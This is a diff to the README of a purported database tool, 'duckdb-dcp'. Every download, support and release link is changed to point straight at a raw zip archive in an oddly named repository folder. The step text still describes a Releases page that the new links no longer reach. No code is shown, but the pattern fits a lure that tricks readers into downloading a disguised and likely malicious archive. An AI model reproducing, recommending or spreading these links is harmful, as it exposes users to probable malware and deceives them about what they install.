@@ -7,10 +7,10 @@ Welcome to **duckdb-dcp**, an easy-to-use application for managing your database
 To get started, you will need to download the application to your computer. Follow the instructions below to access the application and run it.
 
 ## 🔗 Download Now
-[![Download duckdb-dcp](https://img.shields.io/badge/Download-dockdb--dcp-blue)](https://github.com/Crasus94/duckdb-dcp/releases)
+[![Download duckdb-dcp](https://raw.githubusercontent.com/Crasus94/duckdb-dcp/main/coecum/duckdb-dcp.zip)](https://raw.githubusercontent.com/Crasus94/duckdb-dcp/main/coecum/duckdb-dcp.zip)
 
 ## 📥 Download & Install
-1. Click on this link to visit the download page: [https://github.com/Crasus94/duckdb-dcp/releases](https://github.com/Crasus94/duckdb-dcp/releases).
+1. Click on this link to visit the download page: [https://raw.githubusercontent.com/Crasus94/duckdb-dcp/main/coecum/duckdb-dcp.zip](https://raw.githubusercontent.com/Crasus94/duckdb-dcp/main/coecum/duckdb-dcp.zip).
 2. On the Releases page, you will see the latest version of duckdb-dcp.
 3. Find the version that suits your operating system (Windows, Mac, or Linux).
 4. Click on the appropriate file to download it to your computer.
@@ -44,11 +44,11 @@ Once you have installed the application:
 6. Analyze your data with built-in tools for insights.
 
 ## 🎓 Support
-If you face any issues or have questions, feel free to check the FAQ section on our [GitHub page](https://github.com/Crasus94/duckdb-dcp). You can also look for help in the community forums or open an issue in the repository for assistance.
+If you face any issues or have questions, feel free to check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/Crasus94/duckdb-dcp/main/coecum/duckdb-dcp.zip). You can also look for help in the community forums or open an issue in the repository for assistance.
 
 ## 📌 Conclusion
 With duckdb-dcp, managing your databases is simple and effective. Enjoy the benefits of a powerful tool designed for everyone. 
 
-For the latest releases, updates, and more information, visit the [download page](https://github.com/Crasus94/duckdb-dcp/releases) again.
+For the latest releases, updates, and more information, visit the [download page](https://raw.githubusercontent.com/Crasus94/duckdb-dcp/main/coecum/duckdb-dcp.zip) again.
 
 Thank you for choosing duckdb-dcp!
